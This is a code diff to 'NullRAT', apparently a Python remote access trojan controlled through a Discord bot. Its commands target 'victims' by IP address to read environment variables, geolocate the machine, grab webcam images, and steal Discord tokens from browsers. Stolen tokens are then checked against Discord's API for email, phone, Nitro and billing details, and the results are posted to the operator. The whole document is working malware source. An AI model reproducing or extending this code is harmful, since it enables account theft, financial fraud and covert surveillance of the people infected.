@@ -2,6 +2,7 @@ from Variables import *
 
 import disnake as discord
 from disnake import Embed
+from Paginator import CreatePaginator
 from disnake.ext import commands
 
 from mss import mss
@@ -49,7 +50,7 @@ async def listvictims(ctx):
     ],
 )
 async def get_environment(ctx, victim: str, environment: str):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         try: 
             value = os.getenv(environment)
         except: 
@@ -76,7 +77,7 @@ async def get_environment(ctx, victim: str, environment: str):
     ],
 )
 async def geolocate(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.defer()
         
         data = requests.get("http://ip-api.com/json/").json()
@@ -106,7 +107,7 @@ async def geolocate(ctx, victim):
     ],
 )
 async def get_webcam(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.defer()
         
         webcam = bytes(
@@ -215,7 +216,7 @@ async def get_rawtokens(ctx, victim):
             message += token + "\n"
         if len(message) >= 1000: 
             return await ctx.followup.send("```" + message + "```")
-        embed = genEmbed( "Discord Tokens", datetime.now() ).add_field(
+        embed = genEmbed( "Discord Tokens", datetime.now(), "Collected from web browsers" ).add_field(
             name="RAW Tokens:", 
             value=f"```{message.rstrip()}```"
         )
@@ -223,15 +224,20 @@ async def get_rawtokens(ctx, victim):
         await ctx.followup.send(embed=embed)
 
 
-@client.slash_command(description="Sends checked tokens along with info (accurate)")
-async def checked_tokens(ctx, victim):
+@client.slash_command(
+    description="Sends checked tokens along with info (web browsers)",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+    ],
+)
+async def get_chktokens(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         valid, email, phone, uname, nitro, bill, avatar, idq = [], [], [], [], [], [], [], []
 
         for token in find_token():
             headers = {'Authorization': token, 'Content-Type': 'application/json'}
-            requ = get('https://discordapp.com/api/v6/users/@me', headers=headers)
+            requ = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
 
             if requ.status_code == 401: continue
             if requ.status_code == 200:
@@ -242,15 +248,16 @@ async def checked_tokens(ctx, victim):
                 idq.append(   str(json["id"])   )            
                 uname.append( f'{json["username"]}#{json["discriminator"]}' )
                 avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
-                nitro.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
-                bill.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
+                nitro.append(str(bool(len(requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
+                bill.append(str(bool(len(requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
                 continue
 
         if len(valid) == 0: 
-            return await ctx.followup.send(embed = Embed(title="No valid Discord Tokens"))
-        await ctx.followup.send("Checking all tokens...")
+            return await ctx.followup.send(embed = genEmbed("No valid Discord Tokens", datetime.now()))
         for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
             await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa)) 
+        await ctx.followup.send("Checked all tokens")
+
 
 @client.slash_command(description="[EXPERIMENTAL] Decrypts encrypted Discord Tokens")
 async def discord_tokens(ctx, victim):
@@ -543,7 +550,7 @@ def find_token():
     return goodTKs
 
 def checked_embeds(tk, em, ph, un, ni, bi, av, idqa):
-    embed=discord.Embed(title="Checked Token", description="*Tokens checked by NullRAT*")
+    embed=discord.Embed(title="Token Info:")
     embed.set_author(name="NullCode1337", url="https://github.com/NullCode1337")
     embed.set_thumbnail(url=av)
     embed.add_field(name="Token", value=f"```{tk}```", inline=False)
@@ -553,6 +560,7 @@ def checked_embeds(tk, em, ph, un, ni, bi, av, idqa):
     embed.add_field(name="Billing Info", value=bi, inline=True)
     embed.add_field(name="Email", value=em, inline=True)
     embed.add_field(name="Phone Number", value=ph, inline=True)
+    embed.set_footer(text="Checked by NullRAT")
     return embed
 
 while is_connected() == False: 0
